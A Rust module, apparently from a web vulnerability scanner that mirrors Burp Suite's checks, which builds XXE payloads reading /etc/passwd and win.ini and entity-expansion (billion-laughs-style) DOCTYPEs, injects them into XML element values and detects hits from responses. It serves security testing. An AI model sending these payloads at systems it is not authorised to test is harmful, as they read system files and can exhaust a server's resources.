// Split from scan.rs (L5, issue #35). Bodies unchanged; visibility promoted
// to pub(crate) where siblings across the split need access.

use super::*;

/// burp.Zge7.ZC: the XXE DOCTYPE variants. 0 = win.ini, 1 = passwd, and the
/// negative controls 2/3 point at the non-existent `…X` files.
pub fn xxe_doctype(entity: &str, variant: u8) -> String {
    let target = match variant {
        1 => "file:///etc/passwd",
        2 => "file:///c:/windows/win.iniX",
        3 => "file:///etc/passwdX",
        _ => "file:///c:/windows/win.ini",
    };
    format!("<!DOCTYPE foo [<!ENTITY {entity} SYSTEM \"{target}\"> ]>")
}

/// burp.Zmku.ZY: where the DOCTYPE goes. Leading whitespace is skipped, and
/// the XML declaration is stepped over only when the body starts with `<?xml`.
pub fn xml_doc_start(body: &str) -> usize {
    let mut i = body.bytes().take_while(|b| *b <= b' ').count();
    if body[i..].starts_with("<?xml") {
        if let Some(end) = body[i..].find("?>") {
            i += end + 2;
        }
    }
    i
}

/// burp.Zmku.Zs: element-value insertion points (XML_PARAM) after `from`,
/// at most `max`. A point is the text range of a leaf element
/// (`<a>value</a>`, possibly empty). Attributes (XML_ATTR) are not points
/// (burp.Zge7.ZA skips them).
pub fn xml_value_points(body: &str, from: usize, max: usize) -> Vec<(usize, usize)> {
    let mut out = Vec::new();
    let bytes = body.as_bytes();
    let mut i = from;
    while out.len() < max {
        let Some(lt) = body[i..].find('<').map(|x| x + i) else {
            break;
        };
        let Some(gt) = body[lt..].find('>').map(|x| x + lt) else {
            break;
        };
        let tag = &body[lt + 1..gt];
        let is_start = !tag.starts_with('/')
            && !tag.starts_with('?')
            && !tag.starts_with('!')
            && !tag.ends_with('/');
        if is_start {
            let vs = gt + 1;
            if let Some(next) = body[vs..].find('<').map(|x| x + vs) {
                if bytes.get(next + 1) == Some(&b'/') {
                    out.push((vs, next));
                }
            }
        }
        i = gt + 1;
    }
    out
}

/// burp.Zmku.Zs + Zmku.ZW: the body actually probed and its points. With no
/// element value, Burp inserts `<data></data>` at the DOCTYPE position and
/// uses its empty value.
pub fn xxe_points(body: &str) -> (String, usize, Vec<(usize, usize)>) {
    let doc = xml_doc_start(body);
    let points = xml_value_points(body, doc, 10);
    if !points.is_empty() {
        return (body.to_string(), doc, points);
    }
    let base = format!("{}<data></data>{}", &body[..doc], &body[doc..]);
    (base, doc, vec![(doc + 6, doc + 6)])
}

/// burp.Zgij.java:108-150: the DOCTYPE whose first entity is the seed and
/// whose following `depth` entities each reference the preceding one twice,
/// so the top reference expands to the seed repeated 2^depth times.
pub fn entity_expansion_doctype(name: &str, seed: &str, depth: usize) -> String {
    let mut decl = format!("<!DOCTYPE foo [<!ENTITY {name}0 \"{seed}\">");
    for d in 1..=depth {
        decl.push_str(&format!(
            "<!ENTITY {name}{d} \"&{name}{prev};&{name}{prev};\">",
            prev = d - 1
        ));
    }
    format!("{decl} ]>")
}

/// The response marker for a successful expansion at `depth`.
pub fn entity_expansion_marker(seed: &str, depth: usize) -> String {
    seed.repeat(1 << depth)
}

/// The Zgij probe: DOCTYPE at the document position and the original value
/// followed by the top entity reference, the xxe_probe_at shape
/// (burp.Zgij.java:66-71: "the insertion also contains &<entity>;").
pub fn expansion_probe_at(
    base: &str,
    doc: usize,
    point: (usize, usize),
    name: &str,
    seed: &str,
    depth: usize,
) -> String {
    let (vs, ve) = point;
    format!(
        "{}{}{}{}&{name}{depth};{}",
        &base[..doc],
        entity_expansion_doctype(name, seed, depth),
        &base[doc..vs],
        &base[vs..ve],
        &base[ve..]
    )
}

/// burp.Zgij.java:38-47,77-105: over the element-value points, depth 2 then
/// the depth-3 confirmation; report the confirming exchange.
pub fn run_entity_expansion_check<F: FnMut(&str) -> Option<String>>(
    body: &str,
    name: &str,
    seed: &str,
    mut send: F,
) -> Option<(String, String)> {
    let (base, doc, points) = xxe_points(body);
    for point in points {
        let probe = expansion_probe_at(&base, doc, point, name, seed, 2);
        let Some(resp) = send(&probe) else { continue };
        if !resp.contains(&entity_expansion_marker(seed, 2)) {
            continue;
        }
        let confirm = expansion_probe_at(&base, doc, point, name, seed, 3);
        let Some(resp3) = send(&confirm) else {
            continue;
        };
        if !resp3.contains(&entity_expansion_marker(seed, 3)) {
            continue;
        }
        return Some((confirm, resp3));
    }
    None
}

/// burp.Zge7.Ze: DOCTYPE at the document position, then the original value
/// (Zsif.ZT0) followed by the entity reference in place of the value range.
pub fn xxe_probe_at(
    base: &str,
    doc: usize,
    point: (usize, usize),
    entity: &str,
    variant: u8,
) -> String {
    let (vs, ve) = point;
    format!(
        "{}{}{}{}&{entity};{}",
        &base[..doc],
        xxe_doctype(entity, variant),
        &base[doc..vs],
        &base[vs..ve],
        &base[ve..]
    )
}

/// burp.Zge7: for each of up to 10 element values, try win.ini then passwd;
/// report the first variant whose markers appear (baseline-suppressed) while
/// its `X` control (variant + 2) shows none.
pub fn run_xxe_check<F: FnMut(&str) -> Option<String>>(
    body: &str,
    baseline: &str,
    entity: &str,
    mut send: F,
) -> Option<FileReadHit> {
    let (base, doc, points) = xxe_points(body);
    for point in points {
        for os in [OS_WINDOWS, OS_UNIX] {
            let probe = xxe_probe_at(&base, doc, point, entity, os);
            let suppressed = file_marker_baseline(baseline, os);
            let Some(resp) = send(&probe) else { continue };
            let markers = file_marker_hits(&resp, os, &suppressed);
            if markers.is_empty() {
                continue;
            }
            let control =
                send(&xxe_probe_at(&base, doc, point, entity, os + 2)).unwrap_or_default();
            if !file_marker_hits(&control, os, &suppressed).is_empty() {
                continue;
            }
            let file = if os == OS_WINDOWS {
                "win.ini"
            } else {
                "/etc/passwd"
            };
            return Some(FileReadHit {
                payload: probe,
                file,
                markers,
            });
        }
    }
    None
}
